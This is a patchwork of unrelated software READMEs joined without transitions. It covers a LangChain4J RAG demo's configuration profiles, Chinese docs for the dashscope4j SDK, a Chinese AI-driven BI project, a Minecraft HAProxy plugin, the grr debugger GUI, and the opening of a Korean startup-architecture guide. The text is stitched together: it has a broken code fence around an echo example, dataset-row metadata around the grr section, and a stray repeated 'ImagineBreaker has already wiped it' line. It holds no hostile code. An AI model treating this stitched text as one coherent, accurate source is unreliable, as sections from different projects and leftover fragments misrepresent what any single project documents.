- [EasyRAG with LangChain4J](LangChain4J%20EasyRAG%20demo.pdf): a focus on demos 10 and 11, detailing the RAG pattern with LangChain4J

## Configuration

There are several Spring Boot profiles, so you can test the demos with different configurations, tools and models.

### _Option 1_ : Running in the cloud with Azure

This configuration uses:

- __Chat Model__: Azure OpenAI with gpt-4o
- __Image Model__: Azure OpenAI with dalle-3
- __Embedding model__: Azure OpenAI with text-embedding-ada
- __Embedding store__: Azure AI Search

It is enabled by using the `azure` Spring Boot profile.
One way to do this is to set `spring.profiles.active=azure` in the `src/main/resources/application.properties` file.

To provision the Azure resources, you need to run the `src/main/script/deploy-azure-openai-models.sh` script. It will create the following resources:

- An Azure OpenAI instance, with the necessary OpenAI models for this demo.
- An Azure AI Search instance.

At the end of this script, the following environment variables will be displayed (and stored in the `.env` file), and you will need them to run the application:
- `AZURE_OPENAI_ENDPOINT`: your Azure OpenAI URL endpoint.
- `AZURE_OPENAI_KEY`: your Azure OpenAI API key.
- `AZURE_SEARCH_ENDPOINT`: your Azure AI Search URL endpoint.
- `AZURE_SEARCH_KEY`: your Azure AI Search API key.

### _Option 2_ : Fully local, not very good, but small and fast

This configuration uses:

- __Chat Model__: Ollama with tinyllama
- __Image Model__: Not available
- __Embedding model__: in-memory Java with AllMiniLmL6V2EmbeddingModel
- __Embedding store__: Qdrant

It is enabled by using the `small` Spring Boot profile.
One way to do this is to set `spring.profiles.active=small` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-small.yml` file.

It will set up:

- An Ollama instance, with the tinyllama model.
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 3_ : Fully local, not very fast, but with good quality

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Qdrant

It is enabled by using the `good` Spring Boot profile.
One way to do this is to set `spring.profiles.active=good` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-good.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models. Its Web UI is available at [http://localhost:8081/](http://localhost:8081/).
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 4_ : GitHub Models

GitHub Models are available [here](https://github.com/marketplace/models).

This configuration uses:

- __Chat Model__: GitHub Models with gpt-4o-mini
- __Image Model__: Not available
- __Embedding model__: GitHub Models with text-embedding-3-small
- __Embedding store__: Qdrant

It is enabled by using the `github` Spring Boot profile.
One way to do this is to set `spring.profiles.active=github` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-github.yml` file.

It will set up:

- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

For accessing GitHub Models, you'll need an environment variable named `GITHUB_TOKEN` with a GitHub token that grants permission to access the models.

### _Option 5_ : Same as option 3 (""good""), but using Elasticsearch instead of Qdrant as an embedding store

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Elasticsearch

It is enabled by using the `elasticsearch` Spring Boot profile.
One way to do this is to set `spring.profiles.active=elasticsearch` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-elasticsearch.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models.
- An Elasticsearch instance. Its Web UI is available at [http://localhost:8081](http://localhost:8081).

## Running the demos

Once the resources (Azure or local) are configured, you can run the demos using the following command:

```shell
./mvnw spring-boot:run
```

Then you can access the base URL, where you find the Web UI: [http://localhost:8080/](http://localhost:8080/).

The demos are available in the top menu.

### 语音合成

我们可以通过以下代码进行语音合成：

```java
// 文本集合
final var strings = new String[]{
    ""白日依山尽，"",
    ""黄河入海流。"",
    ""欲穷千里目，"",
    ""更上一层楼。""
};

/*
 * 语音合成请求
 * 采样率：16000
 * 编码格式：WAV(PCM)
 */
final var request = SpeechSynthesisRequest.newBuilder()
    .model(SpeechSynthesisModel.COSYVOICE_LONGXIAOCHUN_V1)
    .option(SpeechSynthesisOptions.SAMPLE_RATE, 16000)
    .option(SpeechSynthesisOptions.FORMAT, SpeechSynthesisRequest.Format.WAV)
    .build();

// 以语音合成请求为模板，对每个文本生成一个语音合成请求
final var requests = Stream.of(strings)
    .map(string -> SpeechSynthesisRequest.newBuilder(request)
        .text(string)
        .build()
    )
    .toList();

// 聚合成请求发布器
final var requestPublisher = FlowPublishers.fromIterator(requests);

// 进行语音合成
client.audio().synthesis(request)

    // 打开语音合成数据交互通道：全双工模式，输出到audio.wav文件
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofPath(Path.of(""./audio.wav"")))
    
    // 发送语音合成请求序列
    .thenCompose(exchange -> exchange.writeDataPublisher(requestPublisher))
    
    // 语音合成结束
    .thenCompose(Exchange::finishing)
    
    // 等待通道关闭
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();
```
这样我们就可以获取到生成的`audio.wav`文件，可以试着播放下，符不符合你的要求。

当然你也可以通过`ExchangeListeners.ofByteChannel(...)`方法，将输出的字节流转入到你指定的`ByteChannel`中，比如音频播放设备。这样就可以实现语音播放。
在语音合成结束后，为了避免对通道的占用，需要及时关闭`Exchange`

发送语音合成结束请求：
```java
exchange.finishing()
```

服务端收到结束请求后会主动来关闭通道，你可以调用`Exchange.closeFuture()`方法来获取关闭通道的Future。
```java
exchange.closeFuture()
```

### 语音识别

基于上一节 ""语音合成"" 的示例，我们得到了`audio.wav`，接下来我们可以用语音识别来识别这个音频文件。

```java
// 构建音频文件的ByteBuffer发布器
final var byteBufPublisher = FlowPublishers.fromURI(Path.of(""./audio.wav"").toUri());

/*
 * 构建语音识别请求
 * 采样率：16000
 * 音频格式：WAV(PCM)
 */
final var request = RecognitionRequest.newBuilder()
    .model(RecognitionModel.PARAFORMER_REALTIME_V2)
    .option(RecognitionOptions.SAMPLE_RATE, 16000)
    .option(RecognitionOptions.FORMAT, RecognitionRequest.Format.WAV)
    .build();

// 识别文本缓存
final var stringBuf = new StringBuilder();

// 进行语音识别
client.audio().recognition(request)

    // 打开语音识别数据交互通道：全双工模式，输出到文本缓存
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofConsume(response -> {
        if (response.output().sentence().isEnd()) {
            stringBuf.append(response.output().sentence().text()).append(""\n"");
        }
    }))
    
    // 发送音频文件字节流数据
    .thenCompose(exchange -> exchange.writeByteBufferPublisher(byteBufPublisher))
    
    // 语音识别结束
    .thenCompose(Exchange::finishing)
    
    // 等待通道关闭
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();

// 输出识别文本
System.out.println(stringBuf);
```

文本识别结果为

```text
白日依山尽，黄河入海流。
欲穷千里目，更上一层楼。
```

### 音视频转录

音视频转录不仅能转录音频文件，而且还可以将视频文件中的音频转录为文本。这就省得我们用ffmpeg剥离视频中的音轨这样繁琐的操作了。
在这个例子中，我用我最喜欢的一个动漫《钢之炼金术士》来演示如何从通过音视频转录功能识别视频音轨的文本信息。

> 这对用AI做字幕多少有点启发，毕竟谁没有几个没有字幕的动作片呢？

```java
/*
 * 构建音视频转录请求
 * 语言：日文
 * 选项：过滤语气词（日片中很多以库以库的语气词，各位懂的都懂）
 */
final var request = TranscriptionRequest.newBuilder()
    .model(TranscriptionModel.PARAFORMER_V2)
    // 也可以使用本地文件，本地文件会自动上传到DashScope的临时空间
    .resources(List.of(URI.create(""https://ompc-storage.oss-cn-hangzhou.aliyuncs.com/dashscope4j/video/%5Bktxp%5D%5BFullmetal%20Alchemist%5D%5Bjap_chn%5D01.rmvb"")))
    .option(TranscriptionOptions.ENABLE_DISFLUENCY_REMOVAL, true)
    .option(TranscriptionOptions.LANGUAGE_HINTS, new LanguageHint[]{LanguageHint.JA})
    .build();

// 进行音视频转录
final var response = client.audio().transcription(request)

    // 等待任务完成，每隔30s进行检查任务状态
    .task(Task.WaitStrategies.perpetual(Duration.ofMillis(1000L * 30)))
    .toCompletableFuture()
    .join();

// 合并音视频转录文本（当前只有一个视频）
final var text = response.output().results().stream()
    .map(result-> {
    
        // 下载转录结果
        final var transcription = result.lazyFetchTranscription()
            .toCompletableFuture()
            .join();
    
        // 合并转录句子（每行一个句子）
        return transcription.transcripts().stream()
            .flatMap(transcript->transcript.sentences().stream())
            .map(sentence-> ""%s - %s: %s"".formatted(
                sentence.begin(),
                sentence.end(),
                sentence.text()
            ))
            .reduce((a, b) -> a + ""\n"" + b)
            .orElse("""");
    
    })
    
    // 合并多个音视频转录文本，当前只有一个视频
    .reduce((a, b) -> a + b)
    .orElse("""");

// 输出音视频转录文本
System.out.println(text);
```

输出摘录
```text
13920 - 19960: で き た あ る 大 丈 夫. 
20060 - 24620: 完 璧 だ. 
28380 - 32940: や る ぞ. 
49480 - 58200: 錬 金 術 と は 物 質 の 構 造 を 理 解 し 分 解 し 再 構 築 す る 科 学 技 術 で あ る. 
58820 - 64900: そ れ は う ま く す れ ば 鉛 り か ら 黄 金 を 生 み 出 す こ と も 可 能 に な る. 
65500 - 71760: し か し 科 学 で あ る 以 上 そ こ に は 大 自 然 の 計 測 が 存 在 し た. 
75300 - 79860: 質 量 が 一 の も の か ら は 一 の も の し か 生 み 出 せ な い. 
80200 - 84760: 強 化 交 換 に 計 測. 
```

例子中采用的是一个远程文件，但实际上你也可以使用一个本地文件，例如`Path.of(""./video.mp4"").toUri()`，dashscope4j会将视频文件上传到DashScope的临时空间。

### Tokenizer

在实际开发过程中，为了让AI记住上下文，你需要把之前的聊天记录作为对话上下文输入。但模型的输入长度有限，所以需要将上下文进行分段，然后进行分段输入。
有一种分割方案就是根据模型能支撑的最大token进行切分，这个时候你就需要一个工具来计算一段文本的token数到底是多少，以达到最大化保留记忆的分割目的。

Tokenizer工具能很好的帮助你实现这一点，他分远程和本地两种调用方式，远程性能较差但计算的token会更精准，本地性能最佳，但会存在一定的版本滞后性。
不同的模型，同样的文字，计算的token可能不一样。但大差不差。

在实际生产环境中，推荐使用本地计算的方案。

#### 远程计算

```java
final var messages = List.of(
    Message.ofUser(""北京有哪些好玩地方？""),
    Message.ofAi(""故宫、颐和园、天坛等都是可以去游玩的景点哦。""),
    Message.ofUser(""帮我安排一些行程"")
);

// 远程调用需要明确算法模型
final var list = client.base().tokenize().remote(ChatModel.QWEN_PLUS)
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

#### 本地计算

```java
final var messages = List.of(
    Message.ofUser(""北京有哪些好玩地方？""),
    Message.ofAi(""故宫、颐和园、天坛等都是可以去游玩的景点哦。""),
    Message.ofUser(""帮我安排一些行程"")
);

final var list = client.base().tokenize().local()
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

### 函数调用示例

灵积在 2024-03-12 放出了**函数调用**的功能，当前支持的模型是大语言模型：qwen-turbo、qwen-plus、qwen-max、qwen-max-longcontext，下面是一个函数调用的示例：

#### 单个函数调用示例：回显

假设我们有一个回显函数:`echo`

```java
@ChatFn(name = ""echo"", description = ""当用户输入echo:，回显后边的文字"")
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

  @Override
  public CompletionStage<Echo> call(Echo echo) {
    return CompletableFuture.completedFuture(new Echo(echo.words()));
  }

  public record Echo(
          @JsonPropertyDescription(""需要回显的文字"")
          String words
  ) {

  }

}
```

我们可以通过以下代码来调用这个函数：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_MAX)
    .functions(List.of(new EchoFunction()))
    .messages(List.of(
        Message.ofUser(""echo: HELLO!"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

HELLO!
```

#### 级联函数调用示例：成绩查询

我们有两个函数

- 查询成绩函数：[query_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/QueryScoreFunction.java)
- 计算平均分函数：[compute_avg_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/ComputeAvgScoreFunction.java)

现在需要查询某个同学的所有成绩，并计算其平均分。LLM需要先调用 `query_score` 函数查询成绩，然后再调用 `compute_avg_score`
函数计算平均分。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .functions(List.of(
        new QueryScoreFunction(),
        new ComputeAvgScoreFunction()
    ))
    .messages(List.of(
        Message.ofUser(""张三的所有成绩，并计算平均分"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

### 插件调用示例

#### PDF提取插件

我从网上下载了一份[《第十四个五年规划》](https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf)
的PDF文件，然后通过`PDF提取插件`来提取PDF文件的内容。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .plugins(List.of(ChatPlugin.PDF_EXTRACTER))
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofText(""请总结这篇文档""),
            Content.ofFile(URI.create(""https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf""))
        ))
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

### 支持拦截API调用

通过`DashScopeClient.Builder`设置，可实现AOP的功能，限流控制、失败重试等功能均基于此实现。

示例代码

```java
DashScopeClient client = DashScopeClient.newBuilder()
    .ak(AK)
    .executor(executor)
    .appendInterceptors(List.of(
        new Interceptor() {

            @Override
            public CompletableFuture<?> handle(InvocationContext context, ApiRequest<?> request, OpHandler opHandler) {
                return opHandler.handle(request);
            }

        }
    ))
    .build();
```

### 支持无感使用临时空间

在`对话`、`多模态向量计算`和`文档分析插件`等请求中如果需要解析图片、音频、文档等内容，不再需要提前上传到OSS转换为外网可访问的URL连接。这样极不方便也不安全。

通过灵积平台提供的[临时空间](https://help.aliyun.com/zh/dashscope/developer-reference/guidance-of-temporary-storage-space)
可以很好解决这个问题，但操作起来需要调用额外的api且需要对url进行拼接和替换，略为繁琐。

dashscope4j帮你封装了这个繁琐的操作，你只需要设置内容的时候将本地文件直接传入Content，框架会自动识别并帮你完成临时空间上传和转换连接操作。并自带一个缓存避免重复上传。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .option(ChatOptions.ENABLE_INCREMENTAL_OUTPUT, true)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""图片中一共多少辆自行车?"")
        ))
    ))
    .build();
```

## 六、关于软件

### 版本号声明

软件版本号采用：`大版本`.`小版本`.`漏洞修复`的格式

- **大版本：** 程序的架构设计进行重大升级或重大改造

- **小版本：**
    1. 增加新的API功能
    2. 在现有架构下完成局部架构的微调

- **漏洞修复：** 在不改变现有架构和API情况下，对漏洞修复和增强

### 写在最后

灵积是有官方的Java客户端的，我之所以还需要开发这个`DashScope4j`主要是基于以下几点考虑

1. 官方的SDK并不开源，你无法查看其源码，也无法自行修改和定制
2. 个人练手习惯，反正也不花我多少时间，嗯嗯

# next BI
## 项目介绍

基于 Spring Boot + MQ + AIGC + React的智能数据分析平台。区别于传统 BI，用户只需要导入原始数据集、并输入分析诉求，就能自动生成可视化图表及分析结论，实现数据分析的降本增效。

## 流程图
![流程图.png](next-bi-backend%2Fimage%2F%E6%B5%81%E7%A8%8B%E5%9B%BE.png)


## 项目亮点

### 1. 智能数据分析流程：

- 后端通过自定义Prompt预设模板，封装用户输入的数据和分析诉求。
- 通过AIGC接口生成可视化图表的JSON配置和分析结论，返回给前端进行渲染。

### 2. Excel文件处理优化：

- 由于AIGC的输入Token限制，采用Easy Excel解析用户上传的XLSX表格数据文件并压缩为CSV格式。
- 实测结果显示，此优化提高了单次输入数据量约20%，同时也实现了成本的有效节约。

### 3. 安全性增强：

- 对用户上传的原始数据文件进行多重校验，包括后缀名、大小、内容等，以确保系统的安全性。
- 利用Easy Excel解析成功的文件基本可以确认其内容的合法性。

### 4. 分布式限流与资源控制：

- 基于Redisson的RateLimiter实现分布式限流，控制单用户访问频率，防止恶意占用系统资源。

### 5. 数据存储与查询性能优化：

- 使用MyBatis + 业务层构建自定义SQL，实现对每份原始数据的分表存储，提高查询性能和系统的可扩展性。
- 数据分表存储提高了查询灵活性，同时带来了性能的显著提升。

### 6. 异步化任务处理：

- 基于自定义的IO密集型线程池和任务队列，实现AIGC的并发执行和异步化。
- 提交任务后即可响应前端，大幅度提高用户体验，支持更多用户排队而不是给系统无限压力导致提交失败。

### 7. 消息队列和可靠性提升：

- 引入RabbitMQ分布式消息队列，用于接收和持久化任务消息。
- 通过Direct交换机转发给解耦的AI生成模块消费，提高系统的可靠性，确保任务的可靠处理。

## 优化和增强

### 1. 数据处理进一步优化：

- 利用AI进一步整理和压缩原始数据，提高输入的数据数量和质量。

### 2. 系统资源控制：

- 限制用户同时生成图表的数量，防止单个用户抢占系统资源。

### 3. 用户统计和积分系统：

- 统计用户生成图表的次数，考虑添加积分系统，用户可以消耗积分进行智能分析。

### 4. 缓存优化：

- 由于图表数据是静态的，考虑使用Redis缓存来提高加载速度。

### 5. 异常处理和重试机制：

- 使用死信队列处理异常情况，将图表生成任务置为失败。
- 为任务的执行增加Guava Retrying重试机制，保证系统的可靠性和稳定性。

### 6. 超时控制和反向压力：

- 为任务的执行增加超时时间，超时自动标记为失败，提高系统稳定性。
- 考虑根据调用的服务状态来选择当前系统的策略，实现反向压力控制。

### 7. 实时消息通知：

- 实现任务执行成功或失败后，通过WebSocket或Server-Sent Events给用户发送实时消息通知，提高用户体验。

This [BungeeCord](https://github.com/SpigotMC/BungeeCord/) (and now [Spigot](https://www.spigotmc.org/wiki/spigot/)
and [Velocity](https://papermc.io/software/velocity/)) plugin enables proxied and direct connections both at the same time. More
information about [HAProxy](https://www.haproxy.org/) and its uses can be
found [here](https://github.com/MinelinkNetwork/BungeeProxy/blob/master/README.md).

**Originally made by Andylizi**

**This plugins requires Java11 or higher!**

## Security Warning

Allowing both direct and proxied connections has significant security implications — a malicious player can access the
server through their own HAProxy instance, thus tricking the server into believing the connection is coming from a
fake IP.

To counter this, this plugin implements IP whitelisting. **By default, only proxied connections from `localhost` will be
allowed** (direct connections aren't affected). You can add the IP/domain of your trusted HAProxy instance by
editing `whitelist.conf`, which can be found under the plugin data folder.

<details>
    <summary>Details of the whitelist format</summary>

```
# List of allowed proxy IPs
#
# An empty whitelist will disallow all proxies.
# Each entry must be an valid IP address, domain name or CIDR.
# Domain names will be resolved only once at startup.
# Each domain can have multiple A/AAAA records, all of them will be allowed.
# CIDR prefixes are not allowed in domain names.

127.0.0.0/8
::1/128
```

If you want to disable the whitelist (which you should never do), you can do so by
putting this line verbatim, before any other entries:

```
YesIReallyWantToDisableWhitelistItsExtremelyDangerousButIKnowWhatIAmDoing!!!
```

</details>

## Platform-specific Notes

#### BungeeCord

`proxy_protocol` needs to be enabled in BC `config.yml` for this plugin to work. (Not to be confused with the similar option in `paper.yml`)

Older versions of BC can in theory use [BungeeProxy](https://github.com/MinelinkNetwork/BungeeProxy) in parallel
with this plugin, but it hasn't been tested yet. Feedback is welcomed.

#### Spigot and its derivatives

[ProtocolLib](https://www.spigotmc.org/resources/protocollib.1997/) is a required dependency.
This plugin was developed using ProtocolLib 5.0.

#### Paper

New versions of Paper have built-in HAProxy support (proxied connection only). It's not compatible with this plugin, so please disable the `proxy-protocol` option in `paper.yml`.

#### Velocity

`haproxy-protocol` needs to be enabled in Velocity config for this plugin to work.

Versions older than 3.0 are not supported.

#### Java >= 9

**No need to use this, ImagineBreaker has already wiped it**

If errors like `NoClassDefFoundError: sun.misc.Unsafe`, `InaccessibleObjectException` and such are encountered,
please add `--add-opens java.base/java.lang.invoke=ALL-UNNAMED` to JVM arguments.

#### Java >= 18

**No need to use this, ImagineBreaker has already wiped it**

If errors like `IllegalAccessException: static final field has no write access` are encountered,
please upgrade the plugin to at least v3.0.2.

If you cannot upgrade for whatever reason, a temporary workaround would be to add
`-Djdk.reflect.useDirectMethodHandle=false` to JVM arguments.

Note that this argument will be removed in future Java releases.

## Metrics

This plugin uses [bStats](https://bStats.org) for metrics. It collects some basic information, like how many people
use this plugin and the total player count. You can opt out at any time by editing the config file under
`plugins/bStats/`.

dzaima/grr,master,"## A GUI for `gdb`, `rr`, `perf`, and more

![screenshot](https://dzaima.github.io/images/grr-rr-perf.png)

Build with `./build.py` (needs Java ≥11), run with `./run`. Examples below assume `grr` is linked to `./run`.

Simple example uses:
```sh
grr some-program # run program in gdb
grr -ld -d main some-program # open to a disassembly of the given function
grr --perf perf.data # view ./perf.data (equivalent to `grr --perf .`)
grr --rr # view latest rr trace
grr --rr some-program-1 # view specific rr trace
```

Some potential shell aliases:
```sh
alias rv=""grr --rr"" # view last rr run
alias gd=""grr -ld -d"" # ""gd symname ./file"" to disassemble given symbol
alias gv=""grr -ld -v"" # ""gv ./file"" to view file without running
alias gp=""grr --perf ."" # view perf.data in this directory
```
A custom layout can be saved with ctrl+shift+s, and loaded with `--layout /path/to/file`, or, if saved in `path/to/grr/local/<name>.txt`, with `-l<name>`.

### Key bindings

Where applicable, holding shift will reverse-execute on rr.

### gdb

A simple `grr some-program` will run the program in gdb. `grr some-program foo bar` will run the program with the arguments `foo` & `bar`.

`grr --core path/to/core path/to/program` to view a coredump.



### perf

`grr --perf path/to/perf.data` views data recorded by linux `perf`. `grr --perf path/to` pointing to a directory will implicitly read a `perf.data` file within it.

#### JIT symbol map

An attempt is made to read `/tmp/perf-<pid>.map` for JIT symbol ranges (disassembly not included). The file format is the same as that expected by `perf report`, that is, lines of `hexAddress hexLength name` - e.g. a line of `12AB E my function` represents a function starting at `0x12AB`, 14 bytes long, and the name `my function`.



### [rr](https://rr-project.org/)

The last `rr` recording can be replayed with `grr --rr`, and a specific recording with `grr --rr some-program-123`.

Note that, while the timeline window shows time as seconds, it's actually just interpolating the number of retired conditional branches between the nearest two events (≈ syscall starts/ends) and thus is extremely inaccurate for performance purposes.

The ""timeline manager"" tab allows sampling stacktraces and building a flamegraph out of that - ""ticks"" mode will sample in the visible interval spaced at the specified resolutions, ""stepi"" and ""continue"" will sample running the specified action from the intial position. It is suggested to start from a position at or after the desired sampling interval, otherwise gdb may not pick up the necessary libraries and fail to symbolize.

While mainline rr works, [this fork](https://github.com/dzaima/rr/tree/lightweight-checkpoint) provides additional features:

- instruction-precise ordering of visited spots/samples on the timeline;
- the ability to jump exactly to any previously-visited location;
- much faster ticks-based sampling (as in, ~100 samples/second instead of ~3). Note that, for the faster sampling to properly symbolize, you may need to manually seek beforehand to around the target range (end of recording should work too) for gdb to pick up dynamic libraries.

`--rr` can be combined with `--perf`, `--cachegrind`, and `--jvm-out`.

`/tmp/perf-<pid>.map` is also attempted to be read as [`perf`'s format](#jit-symbol-map) for JIT symbols even without `--perf`.

If recorded as `perf record rr record ...` (as opposed to `rr record ...; perf record rr rerun`), JIT symbols will also see perf data.



### valgrind

Register and memory nibbles are colored based on memcheck status (green - fully defined, red - fully undefined, orange - some bits are defined).

```sh
# start your program:
valgrind --vgdb-error=0 --vgdb-shadow-registers=yes --vex-iropt-register-updates=allregs-at-each-insn ./your-program
# use --vgdb-error=1 instead to immediately run the program after connecting to it, breaking upon hitting an issue

# connect to it:
grr -x 'target remote | /path/to/vgdb' # i.e. the line printed by valgrind above
# if only one valgrind is running at a given time, the --pid=... can be omitted, allowing reusing the single command across multiple invocations
```

### cachegrind (incl. branch simulation)

As `valgrind` outputs its results per source file line and not instruction pointer/address, an adjusted binary must be used where debuginfo has been replaced. This is provided by `--prep-cachegrind`.

A usage sequence may therefore look like:

```sh
grr --prep-cachegrind output-executable input-executable # write the modified executable to output-executable
valgrind --tool=cachegrind --cache-sim=yes --branch-sim=yes --cachegrind-out-file=cachegrind-out ./output-executable # run program, output data to cachegrind-out; tweak to needs
grr --cachegrind cachegrind-out input-executable # view results
```



### Java JIT

![screenshot](https://dzaima.github.io/images/grr-java.png)

```sh
# program must not itself write anything to stdout! (else the output may interleave assembly data printing, and afaict there's no way to redirect it)
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit -XX:+PrintAssembly ... > java-output # record all functions
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit -XX:+DebugNonSafepoints -XX:CompileCommand=print,my.package.Foo::functionName ... > java-output # or record a specific function
# record all functions in my.package.Foo and everything under jdk.incubator.vector with:
#   -XX:CompileCommand=print,my.package.Foo::* -XX:CompileCommand=print,jdk.incubator.vector.*::*
# -XX:+DebugNonSafepoints is implicit for PrintAssembly, but not for CompileCommand (it might help with additional source mapping)

grr --perf . --jvm-out java-output --move /java-src/my/package:path/to/my/package
# the --move remaps my.package.Foo to path/to/my/package/Foo.java (/java-src/ is a hard-coded prefix to differentiate from other paths)
# it can be repeated, or excluded if source mapping isn't desired

# alternatively, just record function names as symbols, without assembly:
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit ...
grr --perf . # plain ""perf report"" works too

# alternatively, all perf stuff can be left out, and ""grr --jvm-out java-output"" allows viewing plain disassemblies
```

Recorded program must be run with Java ≥16 (≥14 with removing `-XX:+DumpPerfMapAtExit`).

The `hsdis` plugin must not be installed, as with it OpenJDK disassembles the machine code itself, whereas here the disassembly needs to be done by gdb.



### Known issues

- I/O with the running program is clunky (`--tty inherit` may be preferable).
- Not all failure cases are properly handled and may result in Java stacktraces being printed; additionally in some scenarios the connection to GDB/MI ""desynchronizes"" and will cease functioning until the app is restarted. Running `grr assume-break` in the ""raw gdb"" tab may or may not fix this.
- Handling of demangling (be it in displaying or taking as input) is inconsistent.",0,0,1,mit,0.0

나는 시리즈 B와 시리즈 C 전후 투자 단계에서 성장하는 복수의 스타트업에 참여하며 다음 단계로 나아가기 위해 마치 탈피의 고통처럼 겪는 기술 문제를 해결하기 위해 많은 기법들을 적용해 왔다. 이와 비슷한 상황에서 기술적 의사결정을 해야 하는 조직이 참고할 수 있도록 그동안의 경험 속에서 자주 반복되는 패턴들을 안내한다.

여기에 설명되는 다양한 모델은 정해진 답으로 제시된 것이 아니며 다양한 기술적 문제를 해결하는 과정의 한가지 힌트일 뿐이다. 모든 엔지니어는 각자가 마주하는 고유한 문제 상황에 대해 스스로 적절한 해결책을 선택할 책임이 있다.

만약 오류가 발견되거나 의문점이 생긴다면 누구나 issue를 등록하거나 pull request를 만들 수 있다.

> [Mermaid](https://mermaid.js.org) 특성상 어두운 테마에서 그림의 가시성이 떨어질 수 있기 때문에 밝은 테마를 권장한다.

## 진화 단계의 시스템 아키텍처 모델

작은 실험과 빠른 프로토타이핑을 위해 설계된 시스템이 덩치가 커지고 요구사항 복잡도가 올라가고 기여하는 엔지니어 수가 늘어나면 기존의 아키텍처는 점점 다양한 비효율과 문제를 일으킨다. 다음 단계로 성장하기 위해 시스템은 보다 구조화되어 관리될 필요가 있다. 이런 상황을 마주하고 있는 팀이 고려해 볼 만한 설계 기법들을 조합한 아키텍처 모델을 설명한다.

### 고수준 아키텍처 모델

가장 높은 시점에서 전체 시스템은 다음 주요 영역으로 구분될 수 있다.

- **UI:** 시스템은 시스템을 사용하는 다양한 고객군을 대상으로 UI 응용프로그램을 제공한다. 예를 들어 쇼핑 서비스의 경우 구매자를 위한 모바일 응용프로그램과 판매자를 위한 웹 응용프로그램을 제공할 수 있다.

- **Domain Model:** 비즈니스 도메인의 문제를 해결하는 영역이다. 이 영역의 구성요소를 정의할 때 도메인 주도 설계의 Bounded Context는 좋은 도구다. Bounded Context를 기준으로 만들어진 구성요소는 정해진 맥락 하에서 담당한 문제에 집중할 수 있다.

- **Gateways:** Domain Model 영역에서 구현된 문제 해법을 시스템 외부에 노출하는 역할을 담당한다. 게이트웨이 응용프로그램은 외부 시스템을 위해 API를 공개할 수도 있고 각 UI 응용프로그램에 특화된 기능을 담당할 수도 있다. 후자의 기능을 담당하는 게이트웨이를 BFF(Backend for Frontend)라고 부른다.

- **Platform:** Domain Model 영역 구성요소를 지원하는 서비스가 구동된다.

- **Legacy Systems:** 폐기 예정이거나 더이상 외부에 노출되지 않지만 Domain Model 영역 구현에 재활용되는 시스템이 이 영역에 위치한다.

#### Bounded Context 간 의존성

Bounded Context는 서로 협력해 더 큰 가치를 생산한다. 한 Bounded Context의 모델이 다른 Bounded Context의 모델에 의존할 때 직접 의존하지 않으며 메시지를 통해 정보를 주고받는 형태로 간접 의존한다. 메시지 교환은 추상화된 인터페이스를 통해 동기적으로 이뤄질 수도 있고 메시지 중개자를 통해 비동기적으로 이뤄질 수도 있다.

